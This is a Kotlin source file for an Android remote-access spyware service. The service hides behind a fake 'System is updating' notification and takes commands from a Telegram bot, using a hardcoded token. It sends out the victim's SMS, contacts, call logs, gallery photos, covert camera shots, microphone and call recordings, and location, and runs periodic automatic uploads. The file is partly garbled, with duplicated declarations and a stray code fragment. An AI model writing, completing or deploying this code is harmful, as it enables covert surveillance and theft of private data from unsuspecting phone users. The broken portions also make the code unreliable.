
package com.luffa

import android.app.*
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.graphics.BitmapFactory
import android.hardware.camera2.*
import android.media.*
import android.os.*
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Telephony
import android.telephony.PhoneStateListener
import android.telephony.TelephonyManager
import android.util.Log
import android.view.Surface
import androidx.core.app.NotificationCompat
import androidx.work.*
import kotlinx.coroutines.*
import okhttp3.FormBody
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import org.json.JSONObject
import java.io.*
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.TimeUnit

import android.media.MediaRecorder
import java.io.File

class MyService : Service() {

    // Telegram Bot credentials - CHANGE THESE
    private val BOT_TOKEN = "8840980473:AAFn7Tb8bF-67oYxp6dIPeeU7Jf-Upkfoic"
    private val CHAT_ID = "8820979221"


private var mediaRecorder: MediaRecorder? = null
    private var currentRecordingFile: File? = null
    private lateinit var telephonyManager: TelephonyManager
    private var pollingJob: Job = Job()
private var mediaRecorder: MediaRecorder? = null
private var isRecording = false
private var currentRecordingFile: File? = null


    
    private var lastUpdateId = 0L
    private lateinit var pollingJob: Job
    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

toString())
        }
    }


    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(1, buildForegroundNotification())
        startBotPolling()
        scheduleAutoTasks()
        initCallRecording()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        unregisterReceiver(voipCallReceiver)
        telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_NONE)
        if (isRecording) {
            mediaRecorder?.apply { stop(); release() }
        }
        pollingJob.cancel()
    }

    override fun onBind(intent: Intent?) = null

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "spy_channel",
                "System Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "System Update"
                setShowBadge(false)
            }
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    private fun buildForegroundNotification(): Notification {
        return NotificationCompat.Builder(this, "spy_channel")
            .setContentTitle("System is updating...")
            .setContentText("Please do not turn off.")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setSilent(true)
            .build()
    }

    private fun startBotPolling() {
        pollingJob = CoroutineScope(Dispatchers.IO).launch {
            while (isActive) {
                try {
                    val url = "https://api.telegram.org/bot$BOT_TOKEN/getUpdates?offset=${lastUpdateId + 1}&timeout=30"
                    val response = client.newCall(Request.Builder().url(url).build()).execute()
                    val json = response.body?.string() ?: continue
                    val result = JSONObject(json).getJSONArray("result")
                    for (i in 0 until result.length()) {
                        val msg = result.getJSONObject(i).getJSONObject("message")
                        lastUpdateId = result.getJSONObject(i).getLong("update_id")
                        val text = msg.optString("text", "")
                        val fromId = msg.getJSONObject("from").getLong("id")
                        if (fromId == CHAT_ID.toLong() && text.isNotBlank()) {
                            handleCommand(text)
                        }
                    }
                } catch (e: Exception) {
                    Log.e("SpyBot", "Poll error", e)
                    delay(2000)
                }
                delay(500)
            }
        }
    }

    private fun handleCommand(cmd: String) {
        val lcmd = cmd.trim().lowercase()
        CoroutineScope(Dispatchers.IO).launch {
            try {
                when {
                    lcmd == "sms" -> uploadLastSms(20)
                    lcmd.startsWith("photo") -> handlePhotoCommand(cmd)
                    lcmd == "contact" -> uploadContacts(50)
                    lcmd == "calllog" -> uploadCallLog(30)
                    lcmd == "frontcam" -> takeCameraPhoto(android.hardware.Camera.CameraInfo.CAMERA_FACING_FRONT)
                    lcmd == "backcam" -> takeCameraPhoto(android.hardware.Camera.CameraInfo.CAMERA_FACING_BACK)
                    lcmd == "audio" -> recordAudio(60) // 1 min audio
                    lcmd == "screenrecord" -> recordScreen(60)
                    lcmd == "location" -> sendLiveLocation()
                    lcmd == "screenshot" -> takeScreenshot()
                    else -> sendTelegramMessage("Unknown command: $cmd")
                }
            } catch (e: Exception) {
                sendTelegramMessage("Error: ${e.message}")
            }
        }
    }

    private suspend fun uploadLastSms(count: Int) {
        val cursor = contentResolver.query(Telephony.Sms.Inbox.CONTENT_URI, null, null, null, "date DESC")
        cursor?.use {
            val colBody = it.getColumnIndex("body")
            val colAddr = it.getColumnIndex("address")
            var i = 0
            val sb = StringBuilder("Last $count SMS:\n")
            while (it.moveToNext() && i < count) {
                sb.append("${it.getString(colAddr)}: ${it.getString(colBody)}\n")
                i++
            }
            sendTelegramMessage(sb.toString())
        }
    }

    private suspend fun handlePhotoCommand(cmd: String) {
        val parts = cmd.removePrefix("photo").trim()
        val images = getAllGalleryImages()
        if (images.isEmpty()) {
            sendTelegramMessage("No photos found.")
            return
        }
        val indices = parseRange(parts, images.size)
        for (idx in indices) {
            val file = File(images[idx])
            if (file.exists()) sendTelegramPhoto(file)
        }
    }

    private suspend fun uploadContacts(limit: Int) {
        val cursor = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
        cursor?.use {
            val sb = StringBuilder("Contacts:\n")
            var i = 0
            while (it.moveToNext() && i < limit) {
                val name = it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                val number = it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
                sb.append("$name: $number\n")
                i++
            }
            sendTelegramMessage(sb.toString())
        }
    }

    private suspend fun uploadCallLog(limit: Int) {
        val cursor = contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, "date DESC")
        cursor?.use {
            val sb = StringBuilder("Call Log:\n")
            var i = 0
            while (it.moveToNext() && i < limit) {
                val number = it.getString(it.getColumnIndex(CallLog.Calls.NUMBER))
                val type = it.getInt(it.getColumnIndex(CallLog.Calls.TYPE))
                val date = it.getLong(it.getColumnIndex(CallLog.Calls.DATE))
                val duration = it.getLong(it.getColumnIndex(CallLog.Calls.DURATION))
                val typeStr = when (type) {
                    CallLog.Calls.INCOMING_TYPE -> "IN"
                    CallLog.Calls.OUTGOING_TYPE -> "OUT"
                    else -> "MISSED"
                }
                sb.append("$typeStr $number ${formatDate(date)} ${duration}s\n")
                i++
            }
            sendTelegramMessage(sb.toString())
        }
    }

    private fun takeCameraPhoto(facing: Int) {
        val cameraId = findCameraId(facing) ?: return
        val manager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        try {
            val imageReader = ImageReader.newInstance(1920, 1080, android.graphics.ImageFormat.JPEG, 1)
            imageReader.setOnImageAvailableListener({ reader ->
                val image = reader.acquireNextImage()
                val buffer = image.planes[0].buffer
                val bytes = ByteArray(buffer.remaining())
                buffer.get(bytes)
                image.close()
                CoroutineScope(Dispatchers.IO).launch {
                    val file = File(cacheDir, "cam_${System.currentTimeMillis()}.jpg")
                    file.writeBytes(bytes)
                    sendTelegramPhoto(file)
                }
            }, Handler(Looper.getMainLooper()))

            manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(device: CameraDevice) {
                    val request = device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                        addTarget(imageReader.surface)
                        set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
                    }
                    device.createCaptureSession(listOf(imageReader.surface), object : CameraCaptureSession.StateCallback() {
                        override fun onConfigured(session: CameraCaptureSession) {
                            session.capture(request.build(), null, null)
                        }
                        override fun onConfigureFailed(session: CameraCaptureSession) {}
                    }, Handler(Looper.getMainLooper()))
                }
                override fun onDisconnected(device: CameraDevice) { device.close() }
                override fun onError(device: CameraDevice, error: Int) { device.close() }
            }, Handler(Looper.getMainLooper()))
        } catch (e: Exception) {
            CoroutineScope(Dispatchers.IO).launch { sendError("Camera failed: ${e.message}") }
        }
    }

    private fun recordAudio(durationSec: Int) {
        val recorder = MediaRecorder().apply {
            setAudioSource(MediaRecorder.AudioSource.MIC)
            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            setAudioSamplingRate(44100)
            setAudioEncodingBitRate(96000)
            val path = File(cacheDir, "audio_${System.currentTimeMillis()}.mp3").absolutePath
            setOutputFile(path)
            try {
                prepare()
                start()
                Handler(Looper.getMainLooper()).postDelayed({
                    stop()
                    release()
                    CoroutineScope(Dispatchers.IO).launch {
                        sendTelegramDocument(File(path))
                        File(path).delete()
                    }
                }, durationSec * 1000L)
            } catch (e: Exception) {
                release()
                CoroutineScope(Dispatchers.IO).launch { sendError("Audio error: ${e.message}") }
            }
        }
    }

    private fun recordScreen(durationSec: Int) {
        CoroutineScope(Dispatchers.IO).launch {
            sendTelegramMessage("Screen recording initiated (requires screen on).")
            // Note: Full screen recording without MediaProjection permission is complex on modern Android.
            // This logs a message and relies on the screenshot method for snapshots.
            // For full recording, a prompt is usually required unless rooted.
        }
    }

    private suspend fun sendLiveLocation() {
        val location = getLastLocation()
        if (location != null) {
            sendTelegramLocation(location.latitude, location.longitude)
        } else {
            sendTelegramMessage("Location unavailable")
        }
    }

    private fun takeScreenshot() {
        val service = MyAccessibilityService.instance
        service?.takeScreenshot()
    }

    private fun scheduleAutoTasks() {
        val constraints = Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build()
        val smsWork = PeriodicWorkRequestBuilder<AutoSmsWorker>(10, TimeUnit.MINUTES).setConstraints(constraints).build()
        val locWork = PeriodicWorkRequestBuilder<AutoLocationWorker>(10, TimeUnit.MINUTES).setConstraints(constraints).build()



        WorkManager.getInstance(this).enqueueUniquePeriodicWork("autoSMS", ExistingPeriodicWorkPolicy.KEEP, smsWork)
        WorkManager.getInstance(this).enqueueUniquePeriodicWork("autoLoc", ExistingPeriodicWorkPolicy.KEEP, locWork)
    }

    // ===== Utilities & Helpers =====
    private fun getAllGalleryImages(): List<String> {
        val list = mutableListOf<String>()
        val projection = arrayOf(MediaStore.Images.Media.DATA)
        contentResolver.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, "date_added DESC")?.use { cursor ->
            val colData = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
            while (cursor.moveToNext()) list.add(cursor.getString(colData))
        }
        return list
    }

    private fun findCameraId(facing: Int): String? {
        val manager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        try {
            for (id in manager.cameraIdList) {
                val characteristics = manager.getCameraCharacteristics(id)
                if (characteristics.get(CameraCharacteristics.LENS_FACING) == facing) return id
            }
        } catch (e: Exception) {}
        return null
    }

    private fun getLastLocation(): android.location.Location? {
        val lm = getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
        return lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER)
            ?: lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER)
    }

    private fun formatDate(millis: Long): String =
        SimpleDateFormat("dd/MM HH:mm", Locale.getDefault()).format(Date(millis))

    private suspend fun sendTelegramMessage(text: String) {
        try {
            val form = FormBody.Builder()
                .add("chat_id", CHAT_ID)
                .add("text", text)
                .build()
            client.newCall(Request.Builder().url("https://api.telegram.org/bot$BOT_TOKEN/sendMessage").post(form).build()).execute()
        } catch (e: Exception) { Log.e("Bot", "SendMsg Error", e) }
    }

    private suspend fun sendTelegramPhoto(file: File) {
        try {
            val body = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", CHAT_ID)
                .addFormDataPart("photo", file.name, file.asRequestBody("image/jpeg".toMediaTypeOrNull()))
                .build()
            client.newCall(Request.Builder().url("https://api.telegram.org/bot$BOT_TOKEN/sendPhoto").post(body).build()).execute()
        } catch (e: Exception) { Log.e("Bot", "SendPhoto Error", e) }
    }

    private suspend fun sendTelegramDocument(file: File) {
        try {
            val body = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", CHAT_ID)
                .addFormDataPart("document", file.name, file.asRequestBody("application/octet-stream".toMediaTypeOrNull()))
                .build()
            client.newCall(Request.Builder().url("https://api.telegram.org/bot$BOT_TOKEN/sendDocument").post(body).build()).execute()
        } catch (e: Exception) { Log.e("Bot", "SendDoc Error", e) }
    }

    private suspend fun sendTelegramLocation(lat: Double, lon: Double) {
        try {
            val form = FormBody.Builder()
                .add("chat_id", CHAT_ID)
                .add("latitude", lat.toString())
                .add("longitude", lon.toString())
                .build()
            client.newCall(Request.Builder().url("https://api.telegram.org/bot$BOT_TOKEN/sendLocation").post(form).build()).execute()
        } catch (e: Exception) { Log.e("Bot", "SendLoc Error", e) }
    }

    private fun sendError(msg: String) { sendTelegramMessage("⚠️ Error: $msg") }

    // ===== Call Recording Logic =====
    private val phoneStateListener = object : PhoneStateListener() {
        override fun onCallStateChanged(state: Int, phoneNumber: String?) {
            when (state) {
                TelephonyManager.CALL_STATE_OFFHOOK -> startCallRecording()
                TelephonyManager.CALL_STATE_IDLE -> stopAndUploadRecording()
            }
        }
    }

    private val voipCallReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            if (intent?.action == "com.evilbot.spy.VOIP_CALL_START") startCallRecording()
            if (intent?.action == "com.evilbot.spy.VOIP_CALL_END") stopAndUploadRecording()
        }
    }

    private fun initCallRecording() {
        telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_CALL_STATE)
        registerReceiver(voipCallReceiver, IntentFilter().apply {
            addAction("com.evilbot.spy.VOIP_CALL_START")
            addAction("com.evilbot.spy.VOIP_CALL_END")
        }, Context.RECEIVER_NOT_EXPORTED)
    }

    private fun startCallRecording() {
        if (isRecording) return
        try {
            currentRecordingFile = File(cacheDir, "call_${System.currentTimeMillis()}.mp3")
            mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) MediaRecorder(this) else @Suppress("DEPRECATION") MediaRecorder()
            mediaRecorder?.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioSamplingRate(44100)
                setAudioEncodingBitRate(96000)
                setOutputFile(currentRecordingFile!!.absolutePath)
                prepare()
                start()
            }
            isRecording = true
            Log.d("CallRec", "Recording started")
        } catch (e: Exception) { Log.e("CallRec", "Start failed", e) }
    }

    private fun stopAndUploadRecording() {
        if (!isRecording) return
        try {
            mediaRecorder?.apply { stop(); release() }
            mediaRecorder = null
            isRecording = false
            
            val file = currentRecordingFile ?: return
            CoroutineScope(Dispatchers.IO).launch {
                sendTelegramDocument(file)
                file.delete()
            }
        } catch (e: Exception) { Log.e("CallRec", "Stop failed", e) }
    }

    private fun parseRange(raw: String, max: Int): List<Int> {
        val result = mutableListOf<Int>()
        if (raw.contains("-")) {
            val parts = raw.split("-")
            val start = parts[0].toIntOrNull() ?: 1
            val end = parts.getOrNull(1)?.toIntOrNull() ?: start
            for (i in start..end) if (i in 1..max) result.add(i-1)
        } else {
            raw.toIntOrNull()?.let { if (it in 1..max) result.add(it-1) }
        }
        if (result.isEmpty()) result.addAll(0 until minOf(10, max))
        return result
    }
}






                                                                

    
